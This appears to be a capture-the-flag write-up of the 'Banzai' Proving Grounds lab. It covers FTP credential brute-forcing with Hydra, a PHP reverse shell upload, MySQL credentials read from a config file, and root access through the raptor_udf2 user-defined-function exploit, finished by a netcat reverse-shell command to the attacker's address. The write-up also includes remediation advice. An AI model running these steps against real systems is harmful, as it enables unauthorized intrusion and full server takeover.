---
Alias: Banzai
Date: 6/5/2022
Platform: Linux
Difficulty: Intermediate
Tags: #MYSQLuserDefinedFunctionsPrivilegeEscalation #ftpUploadReverseShell #BruteforceCommonFTPcredentialsFTPserver
Status: Finished
IP: 192.168.189.56
---

# {{Banzai}}


# Resolution summary
- Used Hydra to brute-force the FTP server with common FTP credentials.
- Discovered directories accessible through webpages
- Uploaded a PHP Reverse Shell to the FTP Server directory.
- Accessing the webpage, I clicked on the reverse shell to obtain a shell.
- Discovered the target machine's MySQL port 3306 was operating as a local host.
- Found the MySQL root credentials in the configuration file.
- I used Google to get instructions on using MYSQL User Defined Functions to escalate privileges for root privileges. 
- Acquired a root shell after following the procedure to escalate privileges.

## Improved skills
- Brute-forcing  FTP server's common credentials
- Reading config files to find credentials
- Learned privilege escalation for MySQL User Defined Functions with root privileges

## Used tools
- nmap
- gobuster

### **Vulnerability Explanation:** Initial Access 

1. Weak FTP Credentials
2. Uploading a PHP reverse shell to an accessible directory on a web server

### **Vulnerability Explanation:** Initial Access 

##### #1. Weak FTP Credentials

Weak FTP credentials refer to FTP (File Transfer Protocol) login credentials that are easily guessable or susceptible to brute-force attacks. This vulnerability can allow unauthorized users to access FTP servers and potentially compromise sensitive data or resources.

1. **Weak Passwords:** Using passwords that are easy to guess, such as "password123" or "admin," increases the risk of unauthorized access.
2. **Brute-Force Attacks:** Attackers can use automated tools to try a large number of password combinations until they find the correct one, exploiting weak credentials.

### **Vulnerability Explanation:** Initial Access 
##### #2. Uploading a PHP reverse shell to an accessible directory on a web server

#### Overview

The vulnerability involving the uploading of a PHP reverse shell to an accessible directory on a web server highlights a critical security risk. This issue arises when an attacker successfully uploads a malicious PHP script to a web-accessible directory, allowing them to establish a reverse shell connection. This connection grants the attacker remote access to the web server's file system and potentially the underlying system, facilitating unauthorized actions such as data theft, website defacement, and further exploitation of the network.

#### Type of Vulnerability: Remote Code Execution (RCE)

#### CWE Reference: CWE-94: Improper Control of Generation of Code ('Code Injection')

#### Generic Description

A PHP reverse shell script is designed to initiate a connection from the target server back to the attacker's machine. Once the connection is established, the attacker can send commands to be executed on the server, essentially providing shell access. This vulnerability is often exploited through file upload functionalities that fail to properly validate or restrict uploaded content, allowing executable PHP files to be uploaded and accessed via a web browser.

#### Specific Risks

1. **Unauthorized System Access**: Gaining shell access allows attackers to execute commands, read sensitive files, and move laterally within the network.
2. **Data Breach and Loss**: Attackers can access and exfiltrate sensitive data, leading to data breaches and potential data loss.
3. **System Compromise**: The attacker can use the server to distribute malware, launch further attacks, or establish a persistent presence on the network.

### **Vulnerability Fix:** Initial Access

##### #1. Weak FTP Credentials

1. **Use Strong Passwords:** Encourage users to use strong, complex passwords that include a mix of letters, numbers, and special characters. Consider using a password manager to generate and store secure passwords.
2. **Implement Account Lockout Policies:** Implement account lockout policies that lock out users after a certain number of failed login attempts to prevent brute-force attacks.
3. **Enable Two-Factor Authentication (2FA):** Implement 2FA to add an extra layer of security, requiring users to provide a second form of verification in addition to their password.
4. **Limit Login Attempts:** Limit the number of login attempts allowed per IP address or account to mitigate brute-force attacks.
5. **Regularly Update FTP Software:** Keep FTP server software up to date with the latest security patches to protect against known vulnerabilities.
6. **Monitor and Audit FTP Logs:** Monitor FTP server logs for suspicious activity and audit login attempts to detect unauthorized access attempts.
7. **Use Secure FTP Protocols:** Consider using secure FTP protocols such as FTPS (FTP Secure) or SFTP (SSH File Transfer Protocol) to encrypt data in transit and protect against eavesdropping.
8. **Educate Users:** Educate users about the importance of using strong passwords and recognizing phishing attempts to prevent credential theft.

By implementing these remediation strategies, organizations can reduce the risk of unauthorized access due to weak FTP credentials and enhance the security of their FTP servers.

### **Vulnerability Fix:** Initial Access

##### #2. Uploading a PHP reverse shell to an accessible directory on a web server

1. **File Upload Validation**: Implement strict validation on file upload functionalities. Restrict the file types that can be uploaded by checking MIME types and file extensions. Avoid allowing executable files or scripts.
    
2. **Use of Web Application Firewalls (WAF)**: Deploy and properly configure a WAF to detect and block malicious file uploads and other common web application attacks.
    
3. **Directory Permissions**: Ensure web-accessible directories do not have write permissions for unauthorized users. Only the server or application should have write permissions, and execution permissions should be limited.
    
4. **Disable Script Execution**: In directories where file uploads are necessary, disable script execution (e.g., for PHP, .htaccess with `php_flag engine off`).
    
5. **Content Security Policy**: Implement a Content Security Policy (CSP) to reduce the risk of XSS attacks that could be used in conjunction with file upload vulnerabilities.
    
6. **User Authentication and Authorization**: Require authentication for file uploads. Implement robust authorization checks to ensure only privileged users can upload files.
    
7. **Regular Security Audits and Penetration Testing**: Conduct regular audits of your web application and server configurations. Use penetration testing to identify and remediate vulnerabilities.
    
8. **Server-Side Antivirus/Malware Scanning**: Automatically scan uploaded files for malware. Consider using solutions that specifically understand web shells and other web-specific threats.
    
9. **Educate Users and Administrators**: Provide training on the risks associated with file uploads and the importance of adhering to security policies.
    
10. **Incident Response Plan**: Develop and maintain an incident response plan that includes procedures for responding to unauthorized file uploads and system compromises.
    
11. **Logging and Monitoring**: Log file upload activities and monitor logs for suspicious behavior. Implement alerting mechanisms for anomalous activities indicative of a breach or attempted exploitation.

By implementing these remediation strategies, organizations can significantly mitigate the risk associated with the uploading of PHP reverse shells or other malicious files, protecting their web servers and underlying systems from unauthorized access and exploitation.

### **Vulnerability Explanation:** Privilege Escalation
1. Readable Config File
2. MySQL User-Defined Functions - Root Privileges

### **Vulnerability Explanation:** Privilege Escalation

##### #1. Readable Config File

#### Overview

A readable configuration file vulnerability occurs when configuration files that contain sensitive information, such as passwords, API keys, or database connection strings, are accessible without proper access restrictions. This vulnerability can lead to unauthorized access to the application's underlying system, data breaches, and potentially full system compromise.

#### Type of Vulnerability: Information Disclosure

#### CWE Reference: CWE-200: Information Exposure

#### Generic Description

Configuration files are essential for defining the operational parameters of an application or system. These files often contain sensitive information crucial for the security and functionality of the system. When these files are not adequately protected, they can be easily accessed by unauthorized users, either locally or remotely, depending on the file's location and the network configuration. The exposure of sensitive information contained within these files can compromise security measures and provide attackers with data necessary for further exploitation.

#### Specific Risks

1. **Unauthorized Access**: Attackers can gain unauthorized access to the application or system using credentials or keys stored in the configuration files.
2. **Privilege Escalation**: Sensitive information can be used to escalate privileges within the system.
3. **Data Breach**: Exposure of database connection strings or API keys can lead to unauthorized data access and exfiltration.


### **Vulnerability Explanation:** Privilege Escalation

##### #2.MySQL User-Defined Functions - Root Privileges

#### Overview

A privilege escalation vulnerability involving MySQL User-Defined Functions (UDFs) can occur when an attacker with limited database access is able to create or manipulate UDFs to execute arbitrary code with the privileges of the MySQL server process, typically `root` or `mysql`. This can lead to unauthorized system access, data manipulation, or compromise of the server hosting the MySQL instance.

#### Type of Vulnerability: Privilege Escalation

#### CWE Reference: CWE-264: Permissions, Privileges, and Access Controls

#### Generic Description

UDFs in MySQL extend the database's functionality by allowing external custom functions to be called within SQL queries. These functions are usually written in C or C++ and compiled into shared libraries that are then loaded into MySQL. If an attacker can inject malicious code into a UDF or create a malicious UDF, and there are inadequate restrictions on UDF creation or execution, they can execute code as the MySQL service, potentially gaining unauthorized access or control over the system.

#### Specific Risks

1. **System Compromise**: Execution of arbitrary code could lead to full system compromise.
2. **Data Breach**: Access to the database process could allow for unauthorized data access, modification, or deletion.
3. **Spread of Malware**: The database server could be used to distribute malware to connected systems.

### **Vulnerability Fix:** Privilege Escalation

##### #1. Readable Config File

1. **File Permissions**: Ensure that configuration files have strict file permissions set. Use operating system access controls to limit file access to authorized users only. For Unix/Linux systems, this can be achieved using chmod to set appropriate read/write/execute permissions.
    
2. **User and Group Ownership**: Set appropriate user and group ownership for configuration files. Only system administrators or the application's user account should own these files, preventing unauthorized users from accessing them.
    
3. **Directory Security**: Place configuration files in secure directories that are not accessible by unauthorized users or services. Avoid storing sensitive configuration files within web-accessible directories.
    
4. **Encryption**: Encrypt sensitive information within configuration files. Use tools or libraries that provide encryption capabilities to protect data such as passwords and API keys.
    
5. **Environment Variables**: Store sensitive information in environment variables instead of plain text files. This approach keeps sensitive data out of source code repositories and minimizes exposure.
    
6. **Access Controls**: Implement additional access controls, such as firewall rules or network access control lists (ACLs), to restrict remote access to configuration files.
    
7. **Auditing and Monitoring**: Enable auditing and monitoring on configuration files to detect unauthorized access attempts or modifications. Review logs regularly for suspicious activity.
    
8. **Secure Development Practices**: Educate developers about the risks associated with storing sensitive information in configuration files and encourage the use of secure storage mechanisms.
    
9. **Regular Security Audits**: Conduct regular security audits of the system to identify and remediate improperly secured configuration files.
    
10. **Patch and Update**: Keep the operating system and applications up to date with the latest security patches. Vulnerabilities in software can sometimes lead to unauthorized file access.
    

By implementing these remediation strategies, organizations can significantly reduce the risk associated with readable configuration files and protect their systems from unauthorized access and potential data breaches.

### **Vulnerability Fix:** Privilege Escalation

##### #2.MySQL User-Defined Functions - Root Privileges

1. **Restrict UDF Creation**: Limit the ability to create or import UDFs to trusted database administrators only. Use database permissions to control access to the `CREATE FUNCTION` command and related UDF management operations.
    
2. **Secure Filesystem Permissions**: Ensure that the directory where UDF shared libraries are stored has strict filesystem permissions. Only the MySQL server and trusted administrators should have read and execute permissions on this directory.
    
3. **Monitor UDF Usage**: Regularly review and monitor the UDFs loaded into the MySQL server. Look for any unusual or unauthorized functions that may indicate a compromise.
    
4. **Apply the Principle of Least Privilege**: Ensure that database accounts are assigned the least privileges necessary for their function. Avoid granting administrative privileges to accounts that do not explicitly require them.
    
5. **Use AppArmor or SELinux**: On systems that support AppArmor or SELinux, configure profiles or policies to restrict the MySQL server process's abilities, including limiting where it can read and execute files.
    
6. **Patch and Update**: Regularly apply patches and updates to MySQL to ensure that known vulnerabilities, including those that might affect UDF functionality, are addressed.
    
7. **Audit and Logging**: Enable comprehensive logging on the MySQL server, including logging of administrative actions and use of the `CREATE FUNCTION` command. Regularly review logs for suspicious activity.
    
8. **Network Access Controls**: Limit network access to the MySQL server to trusted hosts or networks. Consider using firewalls or network ACLs to restrict access.
    
9. **Backup and Recovery Plan**: Maintain regular backups of the MySQL database and have a recovery plan in place. In case of a compromise, this will allow you to restore data and functionality more quickly.
    
10. **Security Awareness**: Train database administrators and developers on security best practices related to UDFs, including the risks of executing untrusted code and the importance of maintaining strict access controls.
    

By implementing these remediation strategies, organizations can significantly mitigate the risk of privilege escalation through MySQL User-Defined Functions and ensure the security and integrity of their database systems.

---

# Information Gathering
Scanned all TCP ports:
```bash
Nmap 7.92 scan initiated Tue Mar 15 04:10:01 2022 as: nmap --open -Pn -sV -sC -p 21,22,25,5432,8080 -oN 192.168.189.56/recon/nmap_detailed_TCP_Quick -oX 192.168.189.56/recon/xml_nmap/nmap_detailed_TCP_Quick_xml 192.168.189.56
Nmap scan report for 192.168.189.56
Host is up (0.16s latency).
 
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
7
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http       Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 15 04:10:17 2022 -- 1 IP address (1 host up) scanned in 17.16 seconds



Nmap 7.92 scan initiated Tue Mar 15 04:09:53 2022 as: nmap --open -sS -Pn -p- -oN 192.168.189.56/recon/nmap_full -oX 192.168.189.56/recon/xml_nmap/nmap_full_xml 192.168.189.56
Nmap scan report for 192.168.189.56
Host is up (0.085s latency).
Not shown: 65528 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
5432/tcp open  postgresql
8080/tcp open  http-proxy
8295/tcp open  unknown
 
# Nmap done at Tue Mar 15 04:13:29 2022 -- 1 IP address (1 host up) scanned in 216.22 seconds
```

Enumerated open TCP ports:
```bash
21
8295
3306
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8295

#### Typed "sudo gobuster dir -u http://192.168.189.56:8295 -w /usr/share/dirb/wordlists/common.txt -e -k -t50 -x "txt,html,php,asp,aspx,jsp" -o "/home/kali/Downloads/ProvingGroundsBoxes/Banzai/tcp_8295_http_common.txt" and found the following directory's I have access to:

![](Images/Pasted%20image%2020220930213106.png)

![](Images/Pasted%20image%2020221001093953.png)

## Port 21

- Based on the previous NMAP scan, port 21 (FTP) has been identified, but anonymous login is not allowed.

# Exploitation - Weak FTP credentials leading to uploading a PHP reverse shell and obtaining a foothold 

Using Hydra and common FTP credentials, we were able to brute-force our way into the FTP server. We then upload a PHP reverse shell to a directory on the FTP server.

- Access the directory "/usr/share/seclists/Passwords/ftp-betterdefaultpasslist.txt" and displayed the contents of the file. Then, saved the usernames and passwords into a new file called "ftp_common_passwords.txt".

![](Images/Pasted%20image%2020221001094042.png)
![](Images/Pasted%20image%2020221001094414.png)
![](Images/Pasted%20image%2020221001094507.png)

- Execute the command below using a password brute forcing tool called hydra and successfully identified the valid username and password combination as admin for the FTP Server.

hydra -f -C ftp_common_passwords.txt 192.168.177.56 ftp

![](Images/Pasted%20image%2020221001094549.png)

- We successfully accessed the FTP server using the credentials and discovered that the "/js" directory was accessible during the previous GoBuster scan.

![](Images/Pasted%20image%2020221001094625.png)

- Enter "lcd" command in the FTP server and discovered that we are currently in the local directory "/home/kali".
  
![](Images/Pasted%20image%2020221001094655.png)

- We create a PHP reverse shell script using a Vim file named “reverse_shell.php” on our Kali machine, which is stored in the “/home/kali” directory.

- We access the "/js" directory on the FTP server.

- We upload the reverse shell into the FTP server on directory "/js" by typing "mput reverse_shell.php".

![](Images/Pasted%20image%2020221001095230.png)

- We initiate a penelope listener via port 8080 on our Kali machine.

- We access the website at http://192.168.143.56:8295/js/.  Discovered the reverse shell uploaded on the page, clicked the link, and successfully obtained a reverse shell on the Penelope listener.

![](Images/Pasted%20image%2020221001095356.png)
![](Images/Pasted%20image%2020221001095428.png)


---


# Privilege Escalation - Readable config file leading to MySQL User-Defined Functions - Root Privileges Privilege Escalation
## Local Enumeration

- After navigating to the directory "/var/www", we discover the "config.php" file. Upon reading the file, we came across the username "root" and the password "EscalateRaftHubris123".

![](Images/Pasted%20image%2020221001095458.png)

- After running the command "netsat –tulpn," we discover that port "3306" (MySQL) is actively listening on localhost.

![](Images/Pasted%20image%2020221001095532.png)

## Port 3306

- We type "mysql –u root –p" and log in with the discovered password for mysql "EscalateRaftHubris123":

![](Images/Pasted%20image%2020221001095708.png)


## Privilege Escalation vector
## MySQL User-Defined Functions - Root Privileges 

- We search for "mysql root privilege escalation" considering we were able to log in with root in Mysql. We come across a webpage that provided a list of steps to escalate privileges.

![](Images/Pasted%20image%2020221001095752.png)
![](Images/Pasted%20image%2020221001095822.png)
![](Images/Pasted%20image%2020221001095848.png)
![](Images/Pasted%20image%2020221001095931.png)
![](Images/Pasted%20image%2020221001100004.png)
![](Images/Pasted%20image%2020221001100029.png)

- We enter the command "searchsploit -m linux/local/1518.c" to transfer the exploit onto our Kali machine.

- We set up a Python HTTP server on our Kali machine to host the "1518.c" file.

- We access the "/var/www" directory on the target machine since it had write permissions.

- We execute the command "wget [kali IP]:8295/1518.c" and successfully download the shared object file to the target machine.

- We enter the command "gcc -g -c 1518.c -o raptor_udf2.o -fPIC" followed by "gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc" to compile it into a shared object file.

 - Again we enter the command "MySQL –u root –p" and successfully log in to MySQL using the discovered password, "EscalateRaftHubris123".

![](Images/Pasted%20image%2020221001100055.png)

- We enter the command "show variables like '%plugin%';" to retrieve the current plugin directory in the database.
  
![](Images/Pasted%20image%2020221001100121.png)

- We enter the command "use mysql;"

- We enter the command "create table foo(line blob);"

- We enter the command "insert into foo values(load_file('/var/www/raptor_udf2.so'));"

- We execute the command "select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';"

- We enter the command "create function do_system returns integer soname 'raptor_udf2.so';"

- We enter the command "select * from MySQL.func;" to verify that the "raptor_udf2.so" shared object file was successfully added to the do_system function table.

![](Images/Pasted%20image%2020221001100150.png)

- We initiate a netcat listener on our Kali machine, set to listen on port 8295.

- We enter the command "select do_system('nc 192.168.49.101 8295 -e /bin/bash');" into the MySQL database on the target machine and successfully gained a root shell.

![](Images/Pasted%20image%2020221001100235.png)


---
